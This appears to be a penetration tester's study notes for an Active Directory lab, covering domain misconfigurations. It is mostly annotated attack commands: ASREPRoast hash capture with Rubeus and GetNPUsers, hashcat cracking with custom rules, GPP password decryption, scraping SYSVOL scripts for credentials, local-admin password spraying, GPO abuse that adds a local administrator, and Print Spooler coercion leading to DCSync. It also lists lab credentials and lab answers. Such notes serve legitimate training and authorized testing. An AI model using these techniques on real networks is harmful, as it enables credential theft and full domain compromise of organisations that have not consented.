# Section 26 — Miscellaneous Misconfigurations

---

## QUICK REFERENCE

```powershell
# Passwords in description fields
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

# Accounts with no password required (PASSWD_NOTREQD)
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

# ASREPRoasting — find vulnerable accounts
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol

# ASREPRoasting — get hash with Rubeus (Windows)
.\Rubeus.exe asreproast /user:TARGET /nowrap /format:hashcat

# ASREPRoasting — get hash from Linux
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

# Crack AS-REP hash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -O

# GPP passwords — find autologon creds
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password

# Decrypt GPP cpassword manually
gpp-decrypt <CPASSWORD_VALUE>

# DNS enumeration
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r   # -r resolves unknown records

# GPO enumeration
Get-DomainGPO | select displayname
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}

# Print Spooler check
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# SYSVOL scripts
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\<scriptname>
```

---

## Misconfiguration Checklist

| What to Check | Tool | Why |
|---------------|------|-----|
| Passwords in description fields | PowerView `Get-DomainUser` | Admins sometimes store passwords in Notes/Description |
| PASSWD_NOTREQD accounts | `Get-DomainUser -UACFilter PASSWD_NOTREQD` | May have blank or trivial passwords |
| DONT_REQ_PREAUTH (ASREPRoast) | `Get-DomainUser -PreauthNotRequired` | Can get crackable hash without a password |
| GPP passwords in SYSVOL | `nxc -M gpp_password` / `gpp_autologin` | AES key published by MS — instant decrypt |
| Credentials in SYSVOL scripts | Browse `\\DC\SYSVOL\domain\scripts\` | Scripts often contain hardcoded passwords |
| DNS records via LDAP | `adidnsdump` | Standard DNS queries miss records — LDAP shows all |
| GPO ACL misconfigs | `Get-DomainGPO \| Get-ObjectAcl` | WriteDACL/GenericWrite on GPO = push commands to OUs |
| Print Spooler running | `Get-SpoolStatus` / `rpcdump.py` | PrintNightmare / coercion attacks |
| Exchange group membership | BloodHound | Exchange Windows Permissions → WriteDACL on domain → DCSync |

---

## ASREPRoasting

**What it is:** If a user has "Do not require Kerberos pre-authentication" set, anyone can ask the DC for their AS-REP ticket without supplying a password first. The DC responds with a ticket encrypted using that user's password hash. Grab the ticket, take it offline, crack it.

**Difference from Kerberoasting:** Kerberoasting needs an SPN and valid credentials to request a TGS. ASREPRoasting needs nothing — just a username. No creds required at all if you can reach the DC.

### Step 1 — Find accounts with pre-auth disabled (Windows)

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1
# Load PowerView so Get-DomainUser is available
```

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
# -PreauthNotRequired = filter for accounts with UAC flag DONT_REQ_PREAUTH set
# select = pull only the columns we care about (don't flood output with 50 AD attributes)
# | fl = format-list so long useraccountcontrol values aren't truncated
```

- Any account in this output is immediately vulnerable — no creds needed to target them
- Note: ygroce also had PASSWD_NOTREQD set — UAC flags stack, so one account can be vulnerable to multiple attacks

### Step 2 — Capture the AS-REP hash (Windows — Rubeus)

```powershell
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
# asreproast = the Rubeus module that performs AS-REP roasting
# /user:ygroce = only request the AS-REP for this specific user (targeted, less noisy than all users)
# /nowrap = output the hash as a single unbroken line — CRITICAL for copy-paste into hashcat
#           without this, the hash wraps at 80 chars and breaks when you paste it into a file
# /format:hashcat = output in $krb5asrep$23$... format (hashcat mode 18200)
#                   default format is john — specify hashcat explicitly to avoid confusion
```

- Output: `$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:CHECKSUM$CIPHERTEXT`
- The checksum is the first 16 bytes of the encrypted blob — hashcat uses this as the "salt" to verify candidates
- **Important:** Copy the ENTIRE hash including the last character. Truncation (even one missing char) causes hashcat to exhaust every password without cracking — it silently runs on a corrupt hash

### Step 3 — Capture the AS-REP hash (Linux — GetNPUsers.py)

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
# INLANEFREIGHT.LOCAL/ = target domain (trailing slash required)
# -dc-ip 172.16.5.5 = IP of the domain controller to send AS-REP requests to
# -no-pass = do not supply domain credentials — this is what makes unauthenticated ASREPRoasting possible
# -usersfile = file containing one username per line to check for pre-auth disabled
#              build this list from earlier enumeration (Kerbrute, LDAP dump, etc.)
```

- Kerbrute automatically dumps AS-REP hashes during user enumeration if pre-auth is disabled — you may already have them
- GetNPUsers.py outputs hashes directly to stdout in hashcat-compatible format

### Step 4 — Crack the AS-REP hash

```bash
# Write hash to a file first — one hash per line, no extra text
# Then crack:
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -O
# -m 18200 = Kerberos 5, etype 23, AS-REP — this is the mode for $krb5asrep$23$ hashes
# hash.txt = the file containing your hash (must be EXACTLY the $krb5asrep$... string, nothing else)
# rockyou.txt = wordlist
# -O = optimized kernel — limits max password length to 31 chars but dramatically improves speed
#      use without -O only if you suspect very long passwords (rare in domain environments)
```

```bash
# If hashcat exhausts rockyou straight, try with mutation rules:
printf ':\nc\nu\nl\nd\n$1\n$2\n$3\n$!\n$@\nc$1\nc$123\nc$1234\nc$!\nu$1\nu$!\n$1$!\n' > /tmp/rules.rule
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -r /tmp/rules.rule -O
# Each line in the rule file is one transformation:
# : = no change (try word as-is)
# c = capitalize first letter
# u = uppercase entire word
# l = lowercase entire word
# d = duplicate word (passwordpassword)
# $1 = append "1" to the end
# $! = append "!" to the end
# c$1 = capitalize AND append 1 (e.g. Password1)
# Rockyou + these rules covers the vast majority of real-world domain passwords
```

- Hash format decoded: `$krb5asrep$23$` → etype 23 = RC4-HMAC (older, crackable) vs etype 17/18 = AES (much harder)
- Lab result: `ygroce` → password `Pass@word`

---

## Passwords in Description Field

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1
```

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
# Get-DomainUser * = pull every user object in the domain via LDAP
# Select-Object samaccountname,description = only show username and description (ignore the other 40+ AD attributes)
# Where-Object {$_.Description -ne $null} = filter out users with no description — reduces noise
```

- Sample output that shows a hit:
  ```
  samaccountname : ldap.agent
  description    : *** DO NOT CHANGE *** 3/12/2012: Sunsh1ne4All!
  ```
- Admins store temp passwords, handoff notes, or "do not change" notices here because it's convenient — and forget they're visible to every domain user
- No elevated rights needed — any authenticated domain user can read description fields
- For large domains, export to CSV to review offline:
  ```powershell
  Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null} | Export-Csv users_desc.csv -NoTypeInformation
  # Export-Csv = write results to a CSV file for offline review
  # -NoTypeInformation = suppress the #TYPE header line that PowerShell adds by default
  ```

---

## PASSWD_NOTREQD Accounts

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
# -UACFilter PASSWD_NOTREQD = filter for accounts where the PASSWD_NOTREQD UAC bit is set
# This UAC flag means the account is exempt from the domain minimum password length policy
# Result: the account may have a blank password, a 1-character password, or a password shorter than policy requires
```

- Why it exists: sometimes set during account creation automation, bulk imports, or legacy migrations — and never cleaned up
- Always test for blank password immediately:
  ```bash
  nxc smb TARGET -u USERNAME -p ''
  # -p '' = empty string = blank password
  # [+] result = the account has no password set at all
  ```
- Report to client even if blank password auth fails — the flag itself is a misconfiguration, regardless of what password is actually set

---

## GPP (Group Policy Preferences) Passwords

**Why it works:** In 2012, Microsoft published the AES-256 encryption key used to protect GPP cpassword values in their MSDN documentation (KB2962486). Once the key is public, every cpassword in SYSVOL is trivially decryptable. The patch (MS14-025) prevents NEW passwords from being stored this way, but does NOT remove existing .xml files in SYSVOL. Assessments on environments untouched since pre-2014 almost always find these.

### Find GPP passwords (Linux — netexec)

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
# smb 172.16.5.5 = target the DC via SMB (SYSVOL is an SMB share on the DC)
# -u forend -p Klmcargo2 = any valid domain credentials — needed to authenticate to SYSVOL
# -M gpp_password = load the gpp_password module, which:
#                   1. Mounts SYSVOL
#                   2. Searches all .xml files recursively for cpassword entries
#                   3. Automatically decrypts any found cpassword values using the published AES key
#                   Output shows: username, cpassword (raw), and decrypted plaintext password
```

### Find autologon credentials (Linux — netexec)

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
# -M gpp_autologin = searches SYSVOL for Registry.xml files that contain autologon settings
# Autologon credentials in Registry.xml are stored in CLEARTEXT — no decryption needed
# These are often for kiosk machines, labs, or legacy workstations
# Output shows: DefaultUserName, DefaultPassword, DefaultDomain
```

### Decrypt a cpassword manually

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
# Pass the raw cpassword value from the .xml file
# Uses the published AES key to decrypt instantly
# No brute force — this is a known-key decrypt, always succeeds
```

- Where to look manually if the nxc module misses something:
  ```bash
  # SYSVOL structure: \\DC\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\
  # Common files with cpasswords:
  #   Groups.xml       → local group membership changes (often adds local admin)
  #   Services.xml     → service account credentials
  #   ScheduledTasks.xml → scheduled task credentials
  #   Drives.xml       → mapped drive credentials
  #   DataSources.xml  → ODBC data source credentials
  ```
- Even if the account the cpassword belongs to seems old or disabled, spray it — accounts get re-enabled during audits, migrations, or by mistake

---

## SYSVOL Script Hunting

```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
# ls = PowerShell alias for Get-ChildItem
# \\DC\SYSVOL\domain\scripts\ = the standard location where logon/logoff scripts are stored
# Every authenticated domain user can read this share — it's designed to be world-readable
# Look for: .bat, .vbs, .ps1, .cmd files — any script that runs at logon could contain credentials
```

```powershell
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
# cat = PowerShell alias for Get-Content
# Read the script — look for hardcoded passwords like:
# sPwd = "!ILFREIGHT_L0cALADmin!"
# strPassword = "Password123"
# $pass = "AdminPass1"
```

- Once you find a hardcoded credential, spray it across all domain computers with local-auth:
  ```bash
  nxc smb 172.16.5.0/24 -u administrator -p 'FoundPassword' --local-auth
  # --local-auth = authenticate to the local SAM (not domain) — critical for local admin credentials
  # This finds every machine where the script set that same local admin password
  # Common result: the script ran on 200 machines and they all have the same local admin password
  ```

---

## DNS Enumeration with adidnsdump

**Why standard DNS queries aren't enough:** When you query DNS normally (`nslookup`, `dig`, `nmap -sn`), you only see records that the DNS server is configured to respond to for your query type. LDAP exposes the raw DNS zone data stored in Active Directory, including records marked as "tombstoned," records for internal services, and records that simply don't have reverse lookups configured. adidnsdump queries DNS via LDAP and shows everything.

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
# -u inlanefreight\\forend = authenticate as this domain user (domain\\username format, double backslash to escape)
# ldap://172.16.5.5 = connect to the DC's LDAP service (port 389)
# Output: records.csv in the current directory
# Some records show as "?" — these are records adidnsdump found but couldn't resolve via LDAP alone
```

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
# -r = attempt to resolve "?" records by making DNS queries for each one
# Slower, but fills in the gaps — reveals hosts that exist in DNS but have no PTR record
# These hidden hosts are often: jump boxes, backup servers, internal web apps, OOB management interfaces
```

```bash
head records.csv
# Review the output file — format: type,name,value
# type = record type (A, CNAME, SRV, etc.)
# name = hostname
# value = IP address or target
# Example hit: A,LOGISTICS,172.16.5.240
#   → LOGISTICS host exists on the network but never showed up in nmap scans
#   → Worth targeting: isolated internal services often have weaker security posture
```

---

## GPO Abuse

**Why GPOs matter for attackers:** Group Policy Objects control what happens to computers and users in linked OUs — startup scripts, software installs, registry settings, local group membership. If you have write rights on a GPO, you control everything it applies to. A GPO linked to "Domain Computers" effectively gives you code execution on every machine in the domain.

### Step 1 — List all GPOs

```powershell
Get-DomainGPO | select displayname
# Get-DomainGPO = PowerView command that queries AD for all GPO objects
# select displayname = show just the name — easier to read than the raw GUID output
# Look for GPOs with names like "Workstation Config", "IT Policy", "Default Policy" — anything an operator might have write access to
```

### Step 2 — Check for Domain Users write rights on GPOs

```powershell
$sid = Convert-NameToSid "Domain Users"
# Convert-NameToSid = translate the group name to its SID for use in ACL comparisons
# "Domain Users" = every domain account is a member — if this group has GPO write rights, any account you compromise can abuse it
# $sid now holds S-1-5-21-...-513
```

```powershell
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
# Get-DomainGPO = get all GPO objects
# | Get-ObjectAcl = pipe each GPO into Get-ObjectAcl to pull its DACL (who has what rights)
# | ? {$_.SecurityIdentifier -eq $sid} = filter results to only show ACEs where the SID matches Domain Users
# Look for: WriteProperty, WriteDacl, WriteOwner, GenericWrite, GenericAll
# Any of these = Domain Users (every authenticated user) can modify this GPO
```

```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
# If the ACL output shows a vulnerable GPO by GUID, convert it to a human-readable name
# -Guid = look up the GPO by its object GUID
# Output shows: DisplayName, Owner, linked OUs — tells you what this GPO controls
```

### Step 3 — Abuse GPO write rights (SharpGPOAbuse)

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount domainuser --GPOName "Vulnerable GPO"
# --AddLocalAdmin = modify the GPO to add a user to the local Administrators group
# --UserAccount domainuser = the account to make local admin (use an account you control)
# --GPOName = the display name of the GPO you have write rights over
# After the next Group Policy refresh (default: 90 minutes, or gpupdate /force), your user
# will be local admin on every computer linked to that GPO's OU
```

- **Scope risk:** GPO changes apply to every computer in every OU the GPO is linked to — confirm the linked OUs before running to avoid making noise on hundreds of machines
- Alternative payloads: `--AddComputerScript` (immediate startup script) or `--AddUserScript` (runs when any user logs in)

---

## Printer Bug (MS-RPRN / Print Spooler Coercion)

**What it is:** The Print Spooler service exposes an RPC interface (MS-RPRN) that any domain user can call. One of its methods (`RpcRemoteFindFirstPrinterChangeNotification`) forces the target host to authenticate to an attacker-specified server. This "coercion" is the primitive that powers PrintNightmare, relaying attacks, and cross-forest trust abuse.

### Check if Print Spooler is running (Windows)

```powershell
Import-Module .\SecurityAssessment.ps1
# Load the SecurityAssessment module which contains the Get-SpoolStatus function
# This is a helper module — not built into Windows or PowerView
```

```powershell
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# -ComputerName = the host to check — use the FQDN for reliability
# Returns True or False
# True = Print Spooler (Spooler service) is running = host is vulnerable to coercion
# False = Print Spooler disabled — coercion won't work, but check via RPC too (see below)
```

### Check via RPC (Linux — more reliable)

```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
# rpcdump.py = impacket tool that enumerates all RPC endpoints exposed on a host
# @172.16.5.5 = target IP (the @ prefix is impacket's syntax for unauthenticated RPC enum)
# egrep 'MS-RPRN|MS-PAR' = filter output for Print System protocols
#   MS-RPRN = Print System Remote Protocol (the classic coercion target)
#   MS-PAR  = Print System Asynchronous Remote Protocol (newer variant, same vulnerability)
# Both present = Print Spooler is running and remotely accessible = coercion will work
```

- **Coercion attacks that use this:** PrintNightmare (DLL injection), NTLM relay to LDAP (grant DCSync), relay to AD CS (get DC certificate → TGT → DCSync), cross-forest trust abuse with unconstrained delegation
- Recommendation: always check the DC for Print Spooler at the start of an engagement — it's a near-instant path to domain compromise when combined with AD CS or unconstrained delegation

---

## Exchange Misconfiguration (Exchange Windows Permissions)

BloodHound edge to look for: `Exchange Windows Permissions` group → `WriteDACL` on the domain object

```
Exchange Windows Permissions group
  └─ WriteDACL on DC=inlanefreight,DC=local (the domain object itself)
       └─ dacledit.py / Add-DomainObjectACL → grant DS-Replication-Get-Changes-All to attacker account
            └─ secretsdump.py → DCSync → full domain compromise
```

- This is a default Exchange installation misconfiguration — not something admins deliberately set
- Any account in the `Exchange Windows Permissions` group can grant themselves DCSync rights
- Check BloodHound: Node Info → Outbound Object Control, or search for the group and look at its edges

---

## Lab Answers

| Question | Answer |
|----------|--------|
| User with PASSWD_NOTREQD starting with "y" | `ygroce` |
| User with pre-auth disabled + cleartext password | `ygroce` / `Pass@word` |

---

## Exam Notes

- Description field passwords = one-liner find, often overlooked by defenders — always run it
- PASSWD_NOTREQD ≠ blank password guaranteed, but always test `nxc smb TARGET -u USER -p ''`
- AS-REP hash = `$krb5asrep$23$` → Hashcat mode 18200 — same crack workflow as Kerberoasting
- `/nowrap` in Rubeus is mandatory — missing one character at end of hash = hashcat exhausts wordlist silently on corrupt data
- Kerbrute automatically dumps AS-REP hashes during user enumeration — two-for-one
- GPP cpassword = AES key published by Microsoft → always instantly crackable → check every engagement
- MS14-025 (2014 patch) stops NEW GPP passwords but does NOT remove existing .xml files in SYSVOL
- SYSVOL scripts = readable by all domain users — always browse `\\DC\SYSVOL\domain\scripts\`
- Once SYSVOL password found, spray with `nxc smb --local-auth` — same script ran on many machines
- adidnsdump `-r` = resolves unknown records — reveals hidden hosts not visible via normal DNS
- GPO WriteDACL = full control over linked OU computers — high impact finding, confirm scope before abusing
- Exchange Windows Permissions group → WriteDACL on domain → DCSync — check for it in BloodHound
- Print Spooler on DC = coercion primitive — combine with AD CS or unconstrained delegation for instant DA
